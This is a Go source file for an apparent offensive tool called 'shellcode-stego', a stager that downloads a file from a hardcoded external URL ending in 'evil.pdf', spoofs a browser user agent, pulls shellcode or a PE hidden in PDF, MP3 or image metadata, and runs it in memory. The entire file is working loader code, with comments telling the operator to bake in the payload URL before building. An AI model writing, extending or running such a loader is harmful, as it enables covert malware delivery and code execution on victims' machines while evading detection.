package main

import (
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"shellcode-stego/pkg/extractor"
	"shellcode-stego/pkg/execute"
)

const (
	// Default URL to download from if none provided, configure this before build to point to your payload to avoid passing CLI flags on run
	defaultDownloadURL = "https://l.station307.com/XNf8J3Lyw2NMfYnhM3Eigg/evil.pdf"
	// feel free to change this to whatever you want.. this is just a stand in so it isn't the go net/http user agent
	userAgent         = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
)

type Config struct {
	URL           string
	ForceImage    bool
	ForceMP3      bool
	ForcePDF      bool
	ForceShellcode bool
}

func parseFlags() (*Config, error) {
	config := &Config{}
	
	flag.BoolVar(&config.ForceImage, "image", false, "Force extraction from image file (PNG/JPEG)")
	flag.BoolVar(&config.ForceMP3, "mp3", false, "Force extraction from MP3 ID3 tags")
	flag.BoolVar(&config.ForcePDF, "pdf", false, "Force extraction from PDF metadata")
	flag.BoolVar(&config.ForceShellcode, "shellcode", false, "Treat payload as raw shellcode (skip extraction)")
	flag.Parse()


	args := flag.Args()
	if len(args) > 0 {
		config.URL = args[0]
		if !isValidURL(config.URL) {
			return nil, errors.New("URL must start with http:// or https://")
		}
	} else {
		config.URL = defaultDownloadURL
	}

	if config.URL == "" {
		return nil, errors.New("no download URL provided and no default URL configured")
	}

	return config, nil
}

func isValidURL(url string) bool {
	return strings.HasPrefix(url, "http://") || strings.HasPrefix(url, "https://")
}

func createHTTPClient() *http.Client {
	return &http.Client{
		Timeout: 60 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 30 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
}

func downloadPayload(url string) ([]byte, error) {
	client := createHTTPClient()

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	req.Header.Set("User-Agent", userAgent)

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to download payload: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP request failed with status %d", resp.StatusCode)
	}

	payload, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response body: %w", err)
	}
	
	return payload, nil
}

func shouldExtract(config *Config, url string) bool {
	if config.ForceShellcode {
		return false
	}
	
	if config.ForceImage || config.ForceMP3 || config.ForcePDF {
		return true
	}
	
	ext := strings.ToLower(filepath.Ext(url))
	switch ext {
	case ".pdf":
		return true
	case ".mp3":
		return true
	case ".png", ".jpg", ".jpeg":
		return true
	case ".bin", ".exe":
		return false 
	default:
		return true
	}
}

func processPayload(payload []byte, config *Config) ([]byte, error) {

	if shouldExtract(config, config.URL) {
		extractedPayload, err := extractor.ExtractPEFromBytes(payload)
		if err != nil {

			fmt.Fprintf(os.Stderr, "Extraction failed, treating as raw payload: %v\n", err)
			return payload, nil
		}
		return extractedPayload, nil
	}
	
	return payload, nil
}

func executePayload(payload []byte) error {
	if len(payload) == 0 {
		return errors.New("payload is empty")
	}
	
	execute.ExecuteShellcode(payload)
	return nil
}

func run() error {
	config, err := parseFlags()
	if err != nil {
		return err
	}
	
	payload, err := downloadPayload(config.URL)
	if err != nil {
		return err
	}
	
	processedPayload, err := processPayload(payload, config)
	if err != nil {
		return err
	}
	
	return executePayload(processedPayload)
}

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "Error: %s\n", err.Error())
	flag.Usage()
		os.Exit(1)
	}
}
